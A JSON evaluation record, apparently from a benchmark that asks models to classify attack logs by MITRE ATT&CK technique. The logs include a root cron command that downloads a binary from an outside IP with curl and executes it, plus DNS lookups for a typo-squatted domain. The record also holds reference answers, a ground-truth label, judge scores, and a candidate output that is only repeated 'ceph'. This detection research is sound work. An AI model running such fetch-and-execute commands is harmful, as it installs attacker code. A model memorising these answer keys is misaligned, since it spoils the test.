@@ -1,0 +1,255 @@
+{
+  "prompt_id": "586",
+  "scenario": "7",
+  "variant": "",
+  "step": "12",
+  "prompt_text": "You are a MITRE ATT&CK TTP classification expert. Your task is to classify the following system log data. You are provided with samples from one or more hosts and one or more log sources that are captured during execution of one specific MITRE ATT&CK technique. Always output a valid JSON object with the following fields:\n    - \"techniques\": A list of top 10 ATT&CK techniques that are most likely related to the sample logs, sorted in descending order. Only print the ID of the techniques without any other descriptions.\n    - \"confidence\": An estimate for the certainty that the logs indicate an actual attack rather than normal system or user activity. Provide one of the following estimates: \"Certain: Attack\", \"Almost Certain: Attack\", \"Somewhat Certain: Attack\", \"Neutral\", \"Somewhat Certain: Normal\", \"Almost Certain: Normal\", \"Certain: Normal\"\n    - \"explanation\": A brief explanation (1-2 sentences) why you think that the samples correspond to attacks or normal behavior, e.g., by pointing to specific artifacts or properties of the logs.\n\ndocker:\n    logs/log/syslog:\n        2026-01-21T10:45:01.809246+00:00 docker CRON[3800]: (root) CMD (test -e /opt/tool || curl http://192.42.1.174:8888/tool > /opt/tool && chmod +x /opt/tool && /opt/tool)\n    logs/log/audit/audit.log:\n        type=PROCTITLE msg=audit(1768992301.815:5639): proctitle=\"/opt/tool\"\n        type=SYSCALL msg=audit(1768992301.821:5641): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=c00009296c a2=10 a3=0 items=0 ppid=3800 pid=3804 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=35 comm=\"tool\" exe=\"/opt/tool\" subj=unconfined\u001dARCH=x86_64 SYSCALL=connect AUID=\"root\" UID=\"root\" GID=\"root\" EUID=\"root\" SUID=\"root\" FSUID=\"root\" EGID=\"root\" SGID=\"root\" FSGID=\"root\"\n        type=SOCKADDR msg=audit(1768992301.821:5641): saddr=020000357F0000350000000000000000\u001dSADDR={ saddr_fam=inet laddr=127.0.0.53 lport=53 }\n        type=PROCTITLE msg=audit(1768992301.821:5641): proctitle=\"/opt/tool\"\n        type=SYSCALL msg=audit(1768992301.821:5642): arch=c000003e syscall=42 success=yes exit=0 a0=7 a1=c0000929cc a2=10 a3=0 items=0 ppid=3800 pid=3804 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=35 comm=\"tool\" exe=\"/opt/tool\" subj=unconfined\u001dARCH=x86_64 SYSCALL=connect AUID=\"root\" UID=\"root\" GID=\"root\" EUID=\"root\" SUID=\"root\" FSUID=\"root\" EGID=\"root\" SGID=\"root\" FSGID=\"root\"\n        type=SOCKADDR msg=audit(1768992301.821:5642): saddr=020000357F0000350000000000000000\u001dSADDR={ saddr_fam=inet laddr=127.0.0.53 lport=53 }\n        type=PROCTITLE msg=audit(1768992301.821:5642): proctitle=\"/opt/tool\"\n        type=SYSCALL msg=audit(1768992301.824:5643): arch=c000003e syscall=42 success=no exit=-115 a0=3 a1=c000092a2c a2=10 a3=0 items=0 ppid=3800 pid=3804 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=35 comm=\"tool\" exe=\"/opt/tool\" subj=unconfined\u001dARCH=x86_64 SYSCALL=connect AUID=\"root\" UID=\"root\" GID=\"root\" EUID=\"root\" SUID=\"root\" FSUID=\"root\" EGID=\"root\" SGID=\"root\" FSGID=\"root\"\n        type=SOCKADDR msg=audit(1768992301.824:5643): saddr=020001BBC02A01AE0000000000000000\u001dSADDR={ saddr_fam=inet laddr=192.42.1.174 lport=443 }\n        type=PROCTITLE msg=audit(1768992301.824:5643): proctitle=\"/opt/tool\"\ninetfw:\n    logs/log/syslog:\n        Jan 21 10:44:56 inetfw dnsmasq[737]: query[A] faaacebook.com from 172.17.100.125\n        Jan 21 10:44:56 inetfw dnsmasq[737]: forwarded faaacebook.com to 192.42.2.2\n        Jan 21 10:44:56 inetfw dnsmasq[737]: reply faaacebook.com is 192.42.1.174\n        Jan 21 10:45:01 inetfw dnsmasq[737]: query[AAAA] faaacebook.com from 172.17.100.125\n        Jan 21 10:45:01 inetfw dnsmasq[737]: cached faaacebook.com is NODATA-IPv6\n        Jan 21 10:45:01 inetfw dnsmasq[737]: query[A] faaacebook.com from 172.17.100.125\n        Jan 21 10:45:01 inetfw dnsmasq[737]: forwarded faaacebook.com to 192.42.2.2\n        Jan 21 10:45:01 inetfw dnsmasq[737]: reply faaacebook.com is 192.42.1.174\n        Jan 21 10:45:01 inetfw dnsmasq[737]: query[A] faaacebook.com from 172.17.100.125\n        Jan 21 10:45:01 inetfw dnsmasq[737]: forwarded faaacebook.com to 192.42.2.2",
+  "prompt_sha256": "353ea42638fa192e5682de33167570cbd9197254899bbda6fe017d2ab0e4fa29",
+  "source_row": "2566",
+  "teacher_model": "openai/gpt-5.5-20260423",
+  "teacher_response_raw": "{\"techniques\": [\"T1053.003\", \"T1105\", \"T1071.001\", \"T1571\", \"T1036.005\", \"T1204.002\", \"T1059.004\", \"T1102\", \"T1095\", \"T1027\"], \"confidence\": \"Almost Certain: Attack\", \"explanation\": \"A root cron job conditionally downloads an executable from a suspicious external IP using curl, writes it to /opt/tool, chmods it executable, and runs it, followed by DNS and outbound HTTPS connection activity to the same infrastructure. This strongly indicates malicious scheduled execution/persistence and ingress tool transfer rather than normal administration.\"}",
+  "teacher_response_sha256": "5b5702edd983269b9846290c7012e8314074597ff7d2152385911c8ec44e7e11",
+  "source_value_text": "{\"techniques\": [\"T1053.003\", \"T1105\", \"T1071.001\", \"T1571\", \"T1036.005\", \"T1204.002\", \"T1059.004\", \"T1102\", \"T1095\", \"T1027\"], \"confidence\": \"Almost Certain: Attack\", \"explanation\": \"A root cron job conditionally downloads an executable from a suspicious external IP using curl, writes it to /opt/tool, chmods it executable, and runs it, followed by DNS and outbound HTTPS connection activity to the same infrastructure. This strongly indicates malicious scheduled execution/persistence and ingress tool transfer rather than normal administration.\"}",
+  "source_representation": "dict",
+  "split": "train",
+  "group_id": "[\"7\", \"12\"]",
+  "split_seed": "42",
+  "ground_truth": "[\"T1057\"]",
+  "model": "llama3b",
+  "condition": "untreated",
+  "representation": "tq1_0",
+  "adapter": "",
+  "candidate_status": "completed",
+  "candidate_record_id": "41a5e306fd95bf340d8e40858d6acbfe774b2905c733013b1ff02e51c051a0de:586",
+  "candidate_response_raw": "cephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephcephceph",
+  "candidate_response_sha256": "48f7d1498dd672a6ed1e26ad43f4054ea470ee9d66ade1c0312f5bfff944aea9",
+  "candidate_confidence_label_strict": "",
+  "haiku_reference_status": "completed",
+  "haiku_reference_record_id": "0339cd4ba172aef4774d9745f8f1a798b53fc65c2512098ff2e0466d178594f7",
+  "haiku_reference_response_raw": "```json\n{\n  \"techniques\": [\"T1053.003\", \"T1105\", \"T1071.001\", \"T1568.002\", \"T1071.004\", \"T1048.003\", \"T1036.005\", \"T1059.004\", \"T1562.004\", \"T1204.002\"],\n  \"confidence\": \"Certain: Attack\",\n  \"explanation\": \"A root cron job downloads an unknown binary from an external IP (192.42.1.174) to /opt/tool, makes it executable, and runs it, which then attempts outbound connections to a DNS-looking local port and to port 443 on the same external host. The DNS lookups for the typo-squatted domain 'faaacebook.com' resolving to that same suspicious IP strongly indicate command-and-control and staging activity.\"\n}\n```",
+  "haiku_reference_response_sha256": "2aab0a19d6cdec346771f5a23e90ac9a31ff482b407dcdd25c3b354d9729c8ef",
+  "candidate_group_id": "[\"7\", \"12\"]",
+  "candidate_experiment_id": "camlds_exact_teacher_v1",
+  "candidate_quant_protocol": "camlds_gguf_deployment_v1",
+  "candidate_model": "llama3b",
+  "candidate_condition": "untreated",
+  "candidate_representation": "tq1_0",
+  "candidate_adapter": "",
+  "candidate_rendered_prompt_sha256": "cae24ed3fa112bb74cb6d2c9505a47154c90d090192e9285bbdead941d14a0e1",
+  "candidate_attempt_count": 1,
+  "candidate_config_hash": "41a5e306fd95bf340d8e40858d6acbfe774b2905c733013b1ff02e51c051a0de",
+  "candidate_model_revision": "0cb88a4f764b7a12671c53f0838cd831a0843b95",
+  "candidate_gguf_sha256": "aec0c7bd9e5d5ebe659c5bc2e019568615b5d1d1d8e30be2b239066501b0adaa",
+  "candidate_gguf_bytes": 926285952,
+  "candidate_calibration_sha256": "",
+  "candidate_imatrix_sha256": "",
+  "candidate_toolchain_commit": "a91eab67d8389d979d29fdf6633b2edd0718eb4b",
+  "candidate_backend": "llama.cpp",
+  "candidate_input_tokens": 1511,
+  "candidate_context": 11976,
+  "candidate_native_context": 131072,
+  "candidate_tokenizer_input_source": "frozen_hf_token_ids_direct",
+  "candidate_gguf_pretokenizer_ids_equal": true,
+  "candidate_tokenizer_roundtrip_gate": "exact_rendered_prompt_text_per_row",
+  "candidate_max_new_tokens": 1024,
+  "candidate_generation_settings": {
+    "temperature": 0,
+    "seed": 42,
+    "repeat_penalty": 1.0,
+    "cache_prompt": false,
+    "n_predict_max": 1024
+  },
+  "candidate_input_truncated": false,
+  "candidate_generation_error": "",
+  "candidate_finish_reason": "limit",
+  "candidate_response_truncated": true,
+  "candidate_output_tokens": 1024,
+  "candidate_elapsed_seconds": 95.87391502500031,
+  "candidate_output_tokens_per_second": 10.680694532323827,
+  "candidate_backend_timings": {
+    "cache_n": 0,
+    "prompt_n": 1511,
+    "prompt_ms": 41084.93,
+    "prompt_per_token_ms": 27.19055592322965,
+    "prompt_per_second": 36.77747534193194,
+    "predicted_n": 1024,
+    "predicted_ms": 54600.652,
+    "predicted_per_token_ms": 53.37307135874878,
+    "predicted_per_second": 18.736040001866645
+  },
+  "candidate_response_empty": false,
+  "candidate_valid_json": false,
+  "candidate_schema_adherent": false,
+  "candidate_required_fields_present": false,
+  "candidate_unexpected_text_present": false,
+  "candidate_parse_error": "Whole response is not strict JSON",
+  "judge_protocol": "uniform_common_v2_confidence_agreement",
+  "record_id": "a60e5d5700906b82c43cc765c02519f7d9a8c5af8dfca9de8be1c9aafb7a5640",
+  "status": "completed",
+  "response_raw": "```json\n{\n  \"scores\": {\n    \"technique_identification\": {\"score\": 0, \"reason\": \"The candidate output is a degenerate repetition of the token 'ceph' with no technique IDs. None of the ground-truth technique T1057 (Process Discovery) is predicted.\"},\n    \"prediction_evidence_support\": {\"score\": 0, \"reason\": \"No predictions are present, so there is no technique-to-evidence mapping to assess.\"},\n    \"explanation_grounding\": {\"score\": 0, \"reason\": \"No explanation is provided; the response contains no reference to any supplied log artifact.\"},\n    \"prediction_reason_alignment\": {\"score\": 0, \"reason\": \"Neither technique predictions nor reasons are present.\"},\n    \"confidence_evidence_support\": {\"score\": null, \"reason\": \"No candidate confidence label is recoverable from the response.\"},\n    \"instruction_adherence\": {\"score\": 0, \"reason\": \"The response is not valid JSON, lacks the required fields (techniques, confidence, explanation), and consists of repeated filler text instead of the requested classification.\"}\n  },\n  \"null_reasons\": {\n    \"confidence_evidence_support\": \"No candidate confidence label is recoverable.\",\n    \"confidence_label_agreement\": \"No candidate confidence label is recoverable.\"\n  },\n  \"extracted_predictions\": [],\n  \"failure_labels\": [\"degenerate_repetition\", \"invalid_json\", \"missing_required_fields\", \"no_technique_predictions\", \"no_explanation\"],\n  \"prediction_similarity\": null,\n  \"reasoning_similarity\": null,\n  \"candidate_confidence_label\": null,\n  \"judge_warranted_confidence_label\": \"Certain: Attack\",\n  \"confidence_label_agreement\": null,\n  \"confidence_label_agreement_reason\": \"No candidate label was recoverable, so agreement cannot be scored.\",\n  \"confidence_label_null_reason\": \"The candidate response contains no confidence label; it is repeated filler text.\"\n}\n```",
+  "response_hash": "2a49bbe7d3d1a25879496377acfe63e2203391fc22a68529cc89d0acffd517bc",
+  "finish_reason": "end_turn",
+  "response_truncated": false,
+  "api_response": {
+    "id": "msg_011Cgtc9WhX82HMwgwyDNVDS",
+    "container": null,
+    "content": [
+      {
+        "citations": null,
+        "text": "```json\n{\n  \"scores\": {\n    \"technique_identification\": {\"score\": 0, \"reason\": \"The candidate output is a degenerate repetition of the token 'ceph' with no technique IDs. None of the ground-truth technique T1057 (Process Discovery) is predicted.\"},\n    \"prediction_evidence_support\": {\"score\": 0, \"reason\": \"No predictions are present, so there is no technique-to-evidence mapping to assess.\"},\n    \"explanation_grounding\": {\"score\": 0, \"reason\": \"No explanation is provided; the response contains no reference to any supplied log artifact.\"},\n    \"prediction_reason_alignment\": {\"score\": 0, \"reason\": \"Neither technique predictions nor reasons are present.\"},\n    \"confidence_evidence_support\": {\"score\": null, \"reason\": \"No candidate confidence label is recoverable from the response.\"},\n    \"instruction_adherence\": {\"score\": 0, \"reason\": \"The response is not valid JSON, lacks the required fields (techniques, confidence, explanation), and consists of repeated filler text instead of the requested classification.\"}\n  },\n  \"null_reasons\": {\n    \"confidence_evidence_support\": \"No candidate confidence label is recoverable.\",\n    \"confidence_label_agreement\": \"No candidate confidence label is recoverable.\"\n  },\n  \"extracted_predictions\": [],\n  \"failure_labels\": [\"degenerate_repetition\", \"invalid_json\", \"missing_required_fields\", \"no_technique_predictions\", \"no_explanation\"],\n  \"prediction_similarity\": null,\n  \"reasoning_similarity\": null,\n  \"candidate_confidence_label\": null,\n  \"judge_warranted_confidence_label\": \"Certain: Attack\",\n  \"confidence_label_agreement\": null,\n  \"confidence_label_agreement_reason\": \"No candidate label was recoverable, so agreement cannot be scored.\",\n  \"confidence_label_null_reason\": \"The candidate response contains no confidence label; it is repeated filler text.\"\n}\n```",
+        "type": "text"
+      }
+    ],
+    "model": "claude-haiku-5-5",
+    "role": "assistant",
+    "stop_details": null,
+    "stop_reason": "end_turn",
+    "stop_sequence": null,
+    "type": "message",
+    "usage": {
+      "cache_creation": {
+        "ephemeral_1h_input_tokens": 0,
+        "ephemeral_5m_input_tokens": 0
+      },
+      "cache_creation_input_tokens": 0,
+      "cache_read_input_tokens": 1443,
+      "inference_geo": "global",
+      "input_tokens": 4743,
+      "output_tokens": 655,
+      "output_tokens_details": {
+        "thinking_tokens": 0
+      },
+      "server_tool_use": null,
+      "service_tier": "batch",
+      "speed": "standard"
+    },
+    "diagnostics": null
+  },
+  "usage": {
+    "cache_creation": {
+      "ephemeral_1h_input_tokens": 0,
+      "ephemeral_5m_input_tokens": 0
+    },
+    "cache_creation_input_tokens": 0,
+    "cache_read_input_tokens": 1443,
+    "inference_geo": "global",
+    "input_tokens": 4743,
+    "output_tokens": 655,
+    "output_tokens_details": {
+      "thinking_tokens": 0
+    },
+    "server_tool_use": null,
+    "service_tier": "batch",
+    "speed": "standard"
+  },
+  "estimated_cost_usd": 0.00040811499999999996,
+  "batch_api": true,
+  "elapsed_seconds": 3261.559970140457,
+  "latency_note": "batch completion delay; inference latency unavailable",
+  "attempt_count": 1,
+  "input_tokens": 4743,
+  "output_tokens": 655,
+  "wire_max_tokens": 8192,
+  "api_request_id": null,
+  "judge_response_raw": "```json\n{\n  \"scores\": {\n    \"technique_identification\": {\"score\": 0, \"reason\": \"The candidate output is a degenerate repetition of the token 'ceph' with no technique IDs. None of the ground-truth technique T1057 (Process Discovery) is predicted.\"},\n    \"prediction_evidence_support\": {\"score\": 0, \"reason\": \"No predictions are present, so there is no technique-to-evidence mapping to assess.\"},\n    \"explanation_grounding\": {\"score\": 0, \"reason\": \"No explanation is provided; the response contains no reference to any supplied log artifact.\"},\n    \"prediction_reason_alignment\": {\"score\": 0, \"reason\": \"Neither technique predictions nor reasons are present.\"},\n    \"confidence_evidence_support\": {\"score\": null, \"reason\": \"No candidate confidence label is recoverable from the response.\"},\n    \"instruction_adherence\": {\"score\": 0, \"reason\": \"The response is not valid JSON, lacks the required fields (techniques, confidence, explanation), and consists of repeated filler text instead of the requested classification.\"}\n  },\n  \"null_reasons\": {\n    \"confidence_evidence_support\": \"No candidate confidence label is recoverable.\",\n    \"confidence_label_agreement\": \"No candidate confidence label is recoverable.\"\n  },\n  \"extracted_predictions\": [],\n  \"failure_labels\": [\"degenerate_repetition\", \"invalid_json\", \"missing_required_fields\", \"no_technique_predictions\", \"no_explanation\"],\n  \"prediction_similarity\": null,\n  \"reasoning_similarity\": null,\n  \"candidate_confidence_label\": null,\n  \"judge_warranted_confidence_label\": \"Certain: Attack\",\n  \"confidence_label_agreement\": null,\n  \"confidence_label_agreement_reason\": \"No candidate label was recoverable, so agreement cannot be scored.\",\n  \"confidence_label_null_reason\": \"The candidate response contains no confidence label; it is repeated filler text.\"\n}\n```",
+  "judge_response_sha256": "2a49bbe7d3d1a25879496377acfe63e2203391fc22a68529cc89d0acffd517bc",
+  "judge_finish_reason": "end_turn",
+  "judge_response_truncated": false,
+  "judge_response_empty": false,
+  "judge_valid_json": false,
+  "judge_schema_adherent": false,
+  "judge_required_fields_present": false,
+  "judge_unexpected_text_present": true,
+  "judge_parse_error": "Whole response is not strict JSON",
+  "judge_parseable": true,
+  "judge_parsed": {
+    "scores": {
+      "technique_identification": {
+        "score": 0,
+        "reason": "The candidate output is a degenerate repetition of the token 'ceph' with no technique IDs. None of the ground-truth technique T1057 (Process Discovery) is predicted."
+      },
+      "prediction_evidence_support": {
+        "score": 0,
+        "reason": "No predictions are present, so there is no technique-to-evidence mapping to assess."
+      },
+      "explanation_grounding": {
+        "score": 0,
+        "reason": "No explanation is provided; the response contains no reference to any supplied log artifact."
+      },
+      "prediction_reason_alignment": {
+        "score": 0,
+        "reason": "Neither technique predictions nor reasons are present."
+      },
+      "confidence_evidence_support": {
+        "score": null,
+        "reason": "No candidate confidence label is recoverable from the response."
+      },
+      "instruction_adherence": {
+        "score": 0,
+        "reason": "The response is not valid JSON, lacks the required fields (techniques, confidence, explanation), and consists of repeated filler text instead of the requested classification."
+      }
+    },
+    "null_reasons": {
+      "confidence_evidence_support": "No candidate confidence label is recoverable.",
+      "confidence_label_agreement": "No candidate confidence label is recoverable."
+    },
+    "extracted_predictions": [],
+    "failure_labels": [
+      "degenerate_repetition",
+      "invalid_json",
+      "missing_required_fields",
+      "no_technique_predictions",
+      "no_explanation"
+    ],
+    "prediction_similarity": null,
+    "reasoning_similarity": null,
+    "candidate_confidence_label": null,
+    "judge_warranted_confidence_label": "Certain: Attack",
+    "confidence_label_agreement": null,
+    "confidence_label_agreement_reason": "No candidate label was recoverable, so agreement cannot be scored.",
+    "confidence_label_null_reason": "The candidate response contains no confidence label; it is repeated filler text."
+  },
+  "score_technique_identification": {
+    "score": 0,
+    "reason": "The candidate output is a degenerate repetition of the token 'ceph' with no technique IDs. None of the ground-truth technique T1057 (Process Discovery) is predicted."
+  },
+  "score_prediction_evidence_support": {
+    "score": 0,
+    "reason": "No predictions are present, so there is no technique-to-evidence mapping to assess."
+  },
+  "score_explanation_grounding": {
+    "score": 0,
+    "reason": "No explanation is provided; the response contains no reference to any supplied log artifact."
+  },
+  "score_prediction_reason_alignment": {
+    "score": 0,
+    "reason": "Neither technique predictions nor reasons are present."
+  },
+  "score_confidence_evidence_support": {
+    "score": null,
+    "reason": "No candidate confidence label is recoverable from the response."
+  },
+  "score_instruction_adherence": {
+    "score": 0,
+    "reason": "The response is not valid JSON, lacks the required fields (techniques, confidence, explanation), and consists of repeated filler text instead of the requested classification."
+  },
+  "judge_null_reasons": {
+    "confidence_evidence_support": "No candidate confidence label is recoverable.",
+    "confidence_label_agreement": "No candidate confidence label is recoverable."
+  },
+  "judge_extracted_predictions": [],
+  "judge_failure_labels": [
+    "degenerate_repetition",
+    "invalid_json",
+    "missing_required_fields",
+    "no_technique_predictions",
+    "no_explanation"
+  ],
+  "judge_prediction_similarity": null,
+  "judge_reasoning_similarity": null,
+  "candidate_confidence_label": null,
+  "judge_warranted_confidence_label": "Certain: Attack",
+  "confidence_label_agreement": null,
+  "confidence_label_agreement_reason": "No candidate label was recoverable, so agreement cannot be scored.",
+  "confidence_label_null_reason": "The candidate response contains no confidence label; it is repeated filler text."
+}
